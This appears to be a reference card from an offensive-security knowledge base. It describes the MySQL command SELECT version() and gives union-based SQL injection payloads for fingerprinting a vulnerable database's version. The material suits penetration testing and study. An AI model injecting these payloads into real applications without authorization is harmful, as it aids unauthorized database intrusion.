---
id: 38c84c73-526f-4226-b45a-0e1ac12472e4
name: mysql-extract-version
type: command
executor: sql
data: SELECT version()
output: null
created_at: '2023-04-06T03:56:34.912644+00:00'
updated_at: '2023-04-10T20:22:50.539408+00:00'
platforms:
  - Linux
  - Web
tags:
  - sql-injection
  - reconnaissance
verified: true
validated: true
---

# mysql-extract-version

## Command

```sql
SELECT version();
```

## Description

This SQL command retrieves the MySQL server version, useful in SQL injection scenarios to confirm compatibility with features like JSON functions. In an exploitation context, it is injected via UNION SELECT to bypass the original query.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | No parameters; returns the full version string. | No |

## Examples

### Basic Usage

```sql
SELECT version();
```

### Injected Usage (Union-Based)

For a vulnerable query with one column:

```sql
' UNION SELECT version() -- -
```

For two columns:

```sql
' UNION SELECT NULL, version() -- -
```

## Expected Output

The command returns a string like "5.7.44-cll-lve" or "8.0.33", which appears in the application's response if injected successfully.

## Related

- [[procedures/Exploit-MySQL-SQL-Injection-Using-Aggregation-Functions]]
